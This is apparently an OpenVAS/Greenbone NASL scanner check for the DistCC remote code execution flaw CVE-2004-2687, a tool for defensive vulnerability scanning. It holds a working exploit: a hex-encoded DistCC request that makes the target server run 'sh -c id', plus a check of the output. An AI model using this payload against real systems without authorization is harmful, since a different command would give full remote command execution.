# Copyright (C) 2012 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103553");
  script_version("2022-07-07T10:16:06+0000");
  script_tag(name:"last_modification", value:"2022-07-07 10:16:06 +0000 (Thu, 07 Jul 2022)");
  script_tag(name:"creation_date", value:"2012-08-23 16:02:21 +0200 (Thu, 23 Aug 2012)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2004-2687");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("DistCC RCE Vulnerability (CVE-2004-2687)");

  script_category(ACT_ATTACK);

  script_family("Gain a shell remotely");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("distcc_detection.nasl");
  script_require_ports("Services/distcc", 3632);
  script_mandatory_keys("distcc/detected");

  script_xref(name:"URL", value:"https://distcc.github.io/security.html");
  script_xref(name:"URL", value:"https://web.archive.org/web/20150511045306/http://archives.neohapsis.com:80/archives/bugtraq/2005-03/0183.html");

  script_tag(name:"summary", value:"DistCC is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"insight", value:"DistCC 2.x, as used in XCode 1.5 and others, when not configured
  to restrict access to the server port, allows remote attackers to execute arbitrary commands via
  compilation jobs, which are executed by the server without authorization checks.");

  script_tag(name:"impact", value:"DistCC by default trusts its clients completely that in turn
  could allow a malicious client to execute arbitrary commands on the server.");

  script_tag(name:"solution", value:"Vendor updates are available. Please see the references for
  more information.

  For more information about DistCC's security see the references.");

  exit(0);
}

include("port_service_func.inc");

port = service_get_port( default:3632, proto:"distcc" );

if( ! soc = open_sock_tcp( port ) )
  exit( 0 );

req = raw_string(
0x44,0x49,0x53,0x54,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x31,0x41,0x52,0x47,0x43,
0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x38,0x41,0x52,0x47,0x56,0x30,0x30,0x30,0x30,
0x30,0x30,0x30,0x32,0x73,0x68,0x41,0x52,0x47,0x56,0x30,0x30,0x30,0x30,0x30,0x30,
0x30,0x32,0x2d,0x63,0x41,0x52,0x47,0x56,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x32)
+ 'id' +
raw_string(0x41,0x52,0x47,0x56,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x31,0x23,0x41,
0x52,0x47,0x56,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x32,0x2d,0x63,0x41,0x52,0x47,
0x56,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x36,0x6d,0x61,0x69,0x6e,0x2e,0x63,0x41,
0x52,0x47,0x56,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x32,0x2d,0x6f,0x41,0x52,0x47,
0x56,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x36,0x6d,0x61,0x69,0x6e,0x2e,0x6f,0x44,
0x4f,0x54,0x49,0x30,0x30,0x30,0x30,0x30,0x30,0x30,0x41,0x57,0x4a,0x79,0x55,0x31,
0x6e,0x70,0x6f,0x62,0x76,0x0a);

send( socket:soc, data:req );
recv = recv( socket:soc, length:512 );
close( soc );

if( recv =~ "uid=[0-9]+.*gid=[0-9]+.*" ) {
  uid = eregmatch( pattern:"(uid=[0-9]+.*gid=[0-9]+[^ ]+)", string:recv );
  report = 'It was possible to execute the "id" command.\n\nResult: ' + uid[1];
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
